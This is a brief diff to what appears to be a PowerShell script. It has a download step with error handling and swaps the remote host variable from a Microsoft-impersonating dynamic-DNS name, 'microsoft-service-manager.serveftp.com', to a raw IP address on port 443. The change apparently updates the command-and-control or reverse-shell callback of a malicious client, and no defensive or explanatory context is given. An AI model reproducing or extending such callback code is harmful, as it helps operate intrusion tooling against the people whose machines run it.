@@ -11,7 +11,7 @@ try {
 } catch {
     Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
-$ip = "microsoft-service-manager.serveftp.com"
+$ip = "164.92.236.24"
 $port = 443
 
 try {
